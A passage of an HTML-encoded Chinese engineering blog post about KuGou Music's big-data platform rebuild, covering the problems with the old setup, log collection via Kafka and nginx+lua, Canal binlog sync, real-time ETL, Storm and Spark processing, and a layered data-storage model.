class=\"headerlink\" title=\"&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;\"></a>&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;</h3><p>1&#x3001;&#x5927;&#x90E8;&#x5206;&#x4F5C;&#x4E1A;&#x901A;&#x8FC7;crontab&#x8C03;&#x5EA6;&#xFF0C;&#x4F5C;&#x4E1A;&#x591A;&#x4E86;&#x540E;&#x4E0D;&#x5229;&#x4E8E;&#x7BA1;&#x7406;<br>2&#x3001;&#x7ECF;&#x5E38;&#x51FA;&#x73B0;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x51B2;&#x7A81;</p>\n<h3 id=\"&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;\"><a href=\"#&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;\" class=\"headerlink\" title=\"&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;\"></a>&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;</h3><p>1&#x3001;&#x53EA;&#x6709;&#x786C;&#x4EF6;&#x4E0E;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x76D1;&#x63A7;<br>2&#x3001;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x65B9;&#x9762;&#x7684;&#x76D1;&#x63A7;&#x7B49;&#x4E8E;&#x7A7A;&#x767D;</p>\n<p>&#x57FA;&#x4E8E;&#x4EE5;&#x4E0A;&#x95EE;&#x9898;&#xFF0C;&#x7ED3;&#x5408;&#x5728;&#x5927;&#x6570;&#x636E;&#x4E2D;&#xFF0C;&#x6570;&#x636E;&#x7684;&#x65F6;&#x6548;&#x6027;&#x8D8A;&#x9AD8;&#xFF0C;&#x6570;&#x636E;&#x8D8A;&#x6709;&#x4EF7;&#x503C;(&#x5982;&#xFF1A;&#x5B9E;&#x65F6;&#x4E2A;&#x6027;&#x5316;&#x63A8;&#x8350;&#x7CFB;&#x7EDF;&#xFF0C;RTB&#x7CFB;&#x7EDF;&#xFF0C;&#x5B9E;&#x65F6;&#x9884;&#x8B66;&#x7CFB;&#x7EDF;&#x7B49;)&#x7684;&#x7406;&#x5FF5;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5F00;&#x59CB;&#x5927;&#x91CD;&#x6784;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x67B6;&#x6784;&#x3002;</p>\n<h2 id=\"&#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;\"><a href=\"#&#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;\" class=\"headerlink\" title=\"&#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;\"></a>&#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;</h2><p>&#x5728;&#x8BB2;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x524D;&#xFF0C;&#x5148;&#x8BB2;&#x4E0B;&#x5927;&#x6570;&#x636E;&#x7279;&#x5F81;&#x4E0E;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x3002;</p>\n<p><strong>1.&#x5927;&#x6570;&#x636E;&#x7279;&#x5F81;</strong>&#xFF1A;&#x201C;&#x5927;&#x91CF;&#x5316;(Volume)&#x3001;&#x591A;&#x6837;&#x5316;(Variety)&#x3001;&#x5FEB;&#x901F;&#x5316;(Velocity)&#x3001;&#x4EF7;&#x503C;&#x5BC6;&#x5EA6;&#x4F4E;(Value)&#x201D;&#x5C31;&#x662F;&#x201C;&#x5927;&#x6570;&#x636E;&#x201D;&#x663E;&#x8457;&#x7684;4V&#x7279;&#x5F81;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#xFF0C;&#x53EA;&#x6709;&#x5177;&#x5907;&#x8FD9;&#x4E9B;&#x7279;&#x70B9;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x624D;&#x662F;&#x5927;&#x6570;&#x636E;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/2.jpg\" alt=\"&#x5927;&#x6570;&#x636E;&#x7279;&#x5F81;\"></p>\n<p><strong>2.&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;</strong>&#xFF1A;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x4E8E;&#x5728;&#x6210;&#x672C;&#x53EF;&#x627F;&#x53D7;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#xFF0C;&#x901A;&#x8FC7;&#x975E;&#x5E38;&#x5FEB;&#x901F;(velocity)&#x5730;&#x91C7;&#x96C6;&#x3001;&#x53D1;&#x73B0;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x4ECE;&#x5927;&#x91CF;(volumes)&#x3001;&#x591A;&#x7C7B;&#x522B;(variety)&#x7684;&#x6570;&#x636E;&#x4E2D;&#x63D0;&#x53D6;&#x4EF7;&#x503C;(value)&#xFF0C;&#x5C06;&#x662F;IT&#x9886;&#x57DF;&#x65B0;&#x4E00;&#x4EE3;&#x7684;&#x6280;&#x672F;&#x4E0E;&#x67B6;&#x6784;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/3.jpg\" alt=\"&#x9700;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;\"></p>\n<p>&#x4ECB;&#x7ECD;&#x4E86;&#x5927;&#x6570;&#x636E;&#x7684;&#x7279;&#x6027;&#x53CA;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x770B;&#x770B;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x7684;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/4.jpg\" alt=\"&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;\"></p>\n<p>&#x4ECE;&#x8FD9;&#x5F20;&#x56FE;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x5230;&#x5927;&#x6570;&#x636E;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x6570;&#x636E;&#x6E90;&#x3001;&#x6570;&#x636E;&#x63A5;&#x5165;&#x3001;&#x6570;&#x636E;&#x6E05;&#x6D17;&#x3001;&#x6570;&#x636E;&#x7F13;&#x5B58;&#x3001;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x6570;&#x636E;&#x670D;&#x52A1;&#x3001;&#x6570;&#x636E;&#x6D88;&#x8D39;&#x7B49;&#x73AF;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x73AF;&#x8282;&#x90FD;&#x6709;&#x5177;&#x6709;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x7B49;&#x7279;&#x6027;&#xFF0C;&#x90FD;&#x4E3A;&#x4E0B;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x66F4;&#x597D;&#x7684;&#x670D;&#x52A1;&#x6253;&#x4E0B;&#x57FA;&#x7840;&#x3002;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x6D41;&#x8FC7;&#x7A0B;&#x90FD;&#x88AB;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF0C;&#x6570;&#x636E;&#x5F02;&#x5E38;&#x81EA;&#x52A8;&#x9884;&#x8B66;&#x3001;&#x544A;&#x8B66;&#x3002;<br>&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6574;&#x4F53;&#x6280;&#x672F;&#x67B6;&#x6784;&#x5982;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/5.jpg\" alt=\"&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;\"></p>\n<p>&#x5C06;&#x5927;&#x6570;&#x636E;&#x8BA1;&#x7B97;&#x5206;&#x4E3A;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E0E;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#xFF0C;&#x5728;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x4E2D;&#xFF0C;&#x5954;&#x7740;&#x80FD;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7684;&#xFF0C;&#x4E00;&#x5B9A;&#x8D70;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x6D41;&#x5904;&#x7406;&#xFF0C;&#x901A;&#x8FC7;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x6D41;&#x6765;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x7684;&#x65F6;&#x6548;&#x6027;&#x53CA;&#x6570;&#x636E;&#x4EF7;&#x503C;&#xFF0C;&#x540C;&#x65F6;&#x51CF;&#x8F7B;&#x96C6;&#x7FA4;&#x7684;&#x8D44;&#x6E90;&#x4F7F;&#x7528;&#x7387;&#x96C6;&#x4E2D;&#x73B0;&#x8C61;&#x3002;</p>\n<h3 id=\"&#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;\"><a href=\"#&#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;\" class=\"headerlink\" title=\"&#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;\"></a>&#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;</h3><h4 id=\"&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;\"><a href=\"#&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;\"></a>&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;</h4><p>&#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x6E90;&#x91C7;&#x96C6;&#x670D;&#x52A1;&#xFF0C;&#x4ECE;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x56FE;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x6570;&#x636E;&#x6E90;&#x5206;&#x4E3A;&#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x65E5;&#x5FD7;&#xFF0C;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x3002;&#x4E0B;&#x9762;&#x8BB2;&#x89E3;&#x6570;&#x636E;&#x662F;&#x600E;&#x4E48;&#x91C7;&#x96C6;&#x63A5;&#x5165;&#x7684;&#x3002;</p>\n<p><strong>a.&#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x63A5;&#x5165;</strong>&#xFF1A;</p>\n<p>&#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x8981;&#x6C42;&#x5B9E;&#x65F6;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#xFF0C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x7B49;&#x7279;&#x6027;&#x3002;&#x6280;&#x672F;&#x9009;&#x578B;&#x65F6;&#xFF0C;&#x5BF9;&#x5F00;&#x6E90;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x5DE5;&#x5177;flume,scribe,chukwa&#x6D4B;&#x8BD5;&#x5BF9;&#x6BD4;&#xFF0C;&#x53D1;&#x73B0;&#x57FA;&#x672C;&#x6EE1;&#x8DB3;&#x4E0D;&#x4E86;&#x6211;&#x4EEC;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x9700;&#x6C42;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x9009;&#x62E9;&#x57FA;&#x4E8E;kafka&#x5F00;&#x53D1;&#x4E00;&#x5957;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#xFF0C;&#x6765;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x9700;&#x6C42;&#x3002;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x7684;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x4E2D;&#x8D70;&#x4E86;&#x4E00;&#x4E9B;&#x5F2F;&#x8DEF;&#xFF0C;&#x6700;&#x540E;&#x91C7;&#x7528;nginx+lua&#x5F00;&#x53D1;&#xFF0C;&#x57FA;&#x4E8E;lua&#x5B9E;&#x73B0;&#x4E86;kafka&#x751F;&#x4EA7;&#x8005;&#x534F;&#x8BAE;&#x3002;&#x6709;&#x5174;&#x8DA3;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x53BB;Github&#x4E0A;&#x770B;&#x770B;&#xFF0C;&#x53E6;&#x4E00;&#x540C;&#x4E8B;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x5728;github&#x4E0A;&#x6BD4;&#x8F83;&#x6D3B;&#x8DC3;&#xFF0C;&#x88AB;&#x4E00;&#x4E9B;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x5E94;&#x7528;&#x4E8E;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#x4E86;&#x3002;</p>\n<p><strong>b.&#x540E;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x63A5;&#x5165;</strong>&#xFF1A;</p>\n<p>FileCollect,&#x8003;&#x8651;&#x5230;&#x5F88;&#x591A;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E0D;&#x80FD;&#x6539;&#x52A8;&#xFF0C;&#x4E3A;&#x51CF;&#x5C11;&#x4FB5;&#x5165;&#x5F0F;&#xFF0C;&#x76EE;&#x524D;&#x662F;&#x91C7;&#x7528;Go&#x8BED;&#x8A00;&#x5B9E;&#x73B0;&#x6587;&#x4EF6;&#x91C7;&#x96C6;&#xFF0C;&#x5E74;&#x540E;&#x4E5F;&#x51C6;&#x5907;&#x91CD;&#x6784;&#x8FD9;&#x5757;&#x3002;</p>\n<p>&#x524D;&#x7AEF;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x6574;&#x4F53;&#x67B6;&#x6784;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/6.jpg\" alt=\"&#x6570;&#x636E;&#x91C7;&#x96C6;&#x67B6;&#x6784;\"></p>\n<p><strong>c.&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x63A5;&#x5165;</strong></p>\n<p>&#x5229;&#x7528;Canal&#x901A;&#x8FC7;MySQL&#x7684;binlog&#x673A;&#x5236;&#x5B9E;&#x65F6;&#x540C;&#x6B65;&#x4E1A;&#x52A1;&#x589E;&#x91CF;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x7EDF;&#x4E00;&#x63A5;&#x5165;&#xFF1A;&#x4E3A;&#x4E86;&#x540E;&#x9762;&#x6570;&#x636E;&#x6D41;&#x73AF;&#x8282;&#x7684;&#x5904;&#x7406;&#x89C4;&#x8303;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x63A5;&#x5165;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#xFF0C;&#x5FC5;&#x987B;&#x901A;&#x8FC7;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x8F6C;&#x6362;&#x7EDF;&#x4E00;&#x4E0A;&#x62A5;&#x7ED9;Kafka&#x96C6;&#x7FA4;&#xFF0C;&#x907F;&#x514D;&#x540E;&#x7AEF;&#x591A;&#x79CD;&#x63A5;&#x5165;&#x65B9;&#x5F0F;&#x7684;&#x5904;&#x7406;&#x95EE;&#x9898;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;(ETL)&#xFF1A;&#x4E3A;&#x4E86;&#x51CF;&#x8F7B;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x96C6;&#x7FA4;&#x7684;&#x8D44;&#x6E90;&#x538B;&#x529B;&#x53CA;&#x6570;&#x636E;&#x53EF;&#x91CD;&#x7528;&#x6027;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x89E3;&#x538B;&#x3001;&#x89E3;&#x5BC6;&#x3001;&#x8F6C;&#x4E49;&#xFF0C;&#x90E8;&#x5206;&#x7B80;&#x5355;&#x7684;&#x8865;&#x5168;&#xFF0C;&#x5F02;&#x5E38;&#x6570;&#x636E;&#x5904;&#x7406;&#x7B49;&#x5DE5;&#x4F5C;&#x524D;&#x79FB;&#x5230;&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x5904;&#x7406;&#xFF0C;&#x4E3A;&#x540E;&#x9762;&#x73AF;&#x8282;&#x7684;&#x6570;&#x636E;&#x91CD;&#x7528;&#x6253;&#x4E0B;&#x624E;&#x5B9E;&#x7684;&#x57FA;&#x7840;(&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E0E;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;)&#x3002;</p>\n<p>&#x6570;&#x636E;&#x7F13;&#x5B58;&#x91CD;&#x7528;&#xFF1A;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x5927;&#x91CF;&#x6570;&#x636E;&#x6D41;(400+&#x4EBF;&#x6761;/&#x5929;)&#x5199;&#x5165;HDFS&#xFF0C;&#x5BFC;&#x81F4;HDFS&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x7A33;&#x5B9A;&#x73B0;&#x8C61;&#x53CA;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6027;&#x8003;&#x8651;&#xFF0C;&#x628A;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x540E;&#x7684;&#x6570;&#x636E;&#x91CD;&#x65B0;&#x5199;&#x5165;Kafka&#x5E76;&#x4FDD;&#x7559;&#x4E00;&#x5B9A;&#x5468;&#x671F;&#xFF0C;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(&#x6279;&#x5904;&#x7406;)&#x901A;&#x8FC7;KG-Camus&#x62C9;&#x5230;HDFS(&#x901A;&#x8FC7;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x76F8;&#x5E94;&#x7684;&#x4F5C;&#x4E1A;&#x8BA1;&#x5212;)&#xFF0C;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x57FA;&#x4E8E;Storm/JStorm&#x76F4;&#x63A5;&#x4ECE;Kafka&#x6D88;&#x8D39;&#xFF0C;&#x6709;&#x5F88;&#x5B8C;&#x7F8E;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;storm-kafka&#x7EC4;&#x4EF6;&#x3002;</p>\n<p>&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(&#x6279;&#x5904;&#x7406;)&#xFF1A;&#x901A;&#x8FC7;spark&#xFF0C;spark SQL&#x5B9E;&#x73B0;&#xFF0C;&#x6574;&#x4F53;&#x6027;&#x80FD;&#x6BD4;hive&#x63D0;&#x9AD8;5&#x2014;10&#x500D;&#xFF0C;hive&#x811A;&#x672C;&#x90FD;&#x5728;&#x8F6C;&#x6362;&#x4E3A;Spark/Spark SQL;&#x90E8;&#x5206;&#x590D;&#x6742;&#x7684;&#x4F5C;&#x4E1A;&#x8FD8;&#x662F;&#x901A;&#x8FC7;Hive/Spark&#x7684;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#x4E2D;&#x5927;&#x90E8;&#x5206;&#x516C;&#x53F8;&#x90FD;&#x4F1A;&#x6D89;&#x53CA;&#x5230;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x4E5F;&#x4E0D;&#x4F8B;&#x5916;&#xFF0C;&#x4E5F;&#x6709;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x53EA;&#x662F;&#x6211;&#x4EEC;&#x5728;&#x505A;&#x5B58;&#x50A8;&#x5206;&#x5C42;&#x8BBE;&#x8BA1;&#x65F6;&#x5F31;&#x5316;&#x4E86;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x6982;&#x5FF5;&#x3002;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5206;&#x5C42;&#x6A21;&#x578B;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/7.jpg\" alt=\"&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5206;&#x5C42;\"></p>\n<p>&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x6A21;&#x578B;&#x5206;&#x4E3A;&#xFF1A;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5C42;Data Cache Layer(DCL)&#x3001;&#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;Data Detail Layer(DDL)&#x3001;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;(Common)&#x3001;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;Data Summary Layer(DSL)&#x3001;&#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;Data Application Layer(DAL)&#x3001;&#x6570;&#x636E;&#x5206;&#x6790;&#x5C42;(Analysis)&#x3001;&#x4E34;&#x65F6;&#x63D0;&#x6570;&#x5C42;(Temp)&#x3002;<br>&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5C42;(DCL)&#xFF1A;&#x5B58;&#x50A8;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#x4E0A;&#x62A5;&#x7684;&#xFF0C;&#x7ECF;&#x8FC7;&#x89E3;&#x7801;&#x3001;&#x6E05;&#x6D17;&#x3001;&#x8F6C;&#x6362;&#x540E;&#x7684;&#x539F;&#x59CB;&#x6570;&#x636E;&#xFF0C;&#x4E3A;&#x6570;&#x636E;&#x8FC7;&#x6EE4;&#x505A;&#x51C6;&#x5907;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;(DDL)&#xFF1A;&#x5B58;&#x50A8;&#x63A5;&#x53E3;&#x7F13;&#x51B2;&#x5C42;&#x6570;&#x636E;&#x7ECF;&#x8FC7;&#x8FC7;&#x6EE4;&#x540E;&#x7684;&#x660E;&#x7EC6;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;(Common)&#xFF1A;&#x4E3B;&#x8981;&#x5B58;&#x50A8;&#x7EF4;&#x8868;&#x6570;&#x636E;&#x4E0E;&#x5916;&#x90E8;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;(DSL)&#xFF1A;&#x5B58;&#x50A8;&#x5BF9;&#x660E;&#x7EC6;&#x6570;&#x636E;&#xFF0C;&#x6309;&#x4E1A;&#x52A1;&#x4E3B;&#x9898;&#xFF0C;&#x4E0E;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x540E;&#x7684;&#x7528;&#x6237;&#x884C;&#x4E3A;&#x4E3B;&#x9898;&#x6570;&#x636E;&#x3001;&#x7528;&#x6237;&#x884C;&#x4E3A;&#x5BBD;&#x8868;&#x6570;&#x636E;&#x3001;&#x8F7B;&#x91CF;&#x6C47;&#x603B;&#x6570;&#x636E;&#x7B49;&#x3002;&#x4E3A;&#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;&#x7EDF;&#x8BA1;&#x8BA1;&#x7B97;&#x63D0;&#x4F9B;&#x57FA;&#x7840;&#x6570;&#x636E;&#x3002;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;&#x7684;&#x6570;&#x636E;&#x6C38;&#x4E45;&#x4FDD;&#x5B58;&#x5728;&#x96C6;&#x7FA4;&#x4E2D;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;(DAL)&#xFF1A;&#x5B58;&#x50A8;&#x8FD0;&#x8425;&#x5206;&#x6790;(Operations Analysis )&#x3001;&#x6307;&#x6807;&#x4F53;&#x7CFB;(Metrics System)&#x3001;&#x7EBF;&#x4E0A;&#x670D;&#x52A1;(Online Service)&#x4E0E;&#x7528;&#x6237;&#x5206;&#x6790;(User Analysis)&#x7B49;&#x3002;&#x9700;&#x8981;&#x5BF9;&#x5916;&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x8FD9;&#x4E00;&#x5C42;&#x3002;&#x4E3B;&#x8981;&#x57FA;&#x4E8E;&#x70ED;&#x6570;&#x636E;&#x90E8;&#x5206;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x5468;&#x671F;&#x7684;&#x6570;&#x636E;&#x8FD8;&#x9700;&#x8981;&#x5230;DSL&#x5C42;&#x88C5;&#x8F7D;&#x67E5;&#x8BE2;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x5206;&#x6790;&#x5C42;(Analysis)&#xFF1A;&#x5B58;&#x50A8;&#x5BF9;&#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;&#x3001;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;&#x3001;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;&#x5173;&#x8054;&#x540E;&#x7ECF;&#x8FC7;&#x7B97;&#x6CD5;&#x8BA1;&#x7B97;&#x7684;&#x3001;&#x4E3A;&#x63A8;&#x8350;&#x3001;&#x5E7F;&#x544A;&#x3001;&#x699C;&#x5355;&#x7B49;&#x6570;&#x636E;&#x6316;&#x6398;&#x9700;&#x6C42;&#x63D0;&#x4F9B;&#x4E2D;&#x95F4;&#x7ED3;&#x679C;&#x7684;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x4E34;&#x65F6;&#x63D0;&#x6570;&#x5C42;(Temp)&#xFF1A;&#x5B58;&#x50A8;&#x4E34;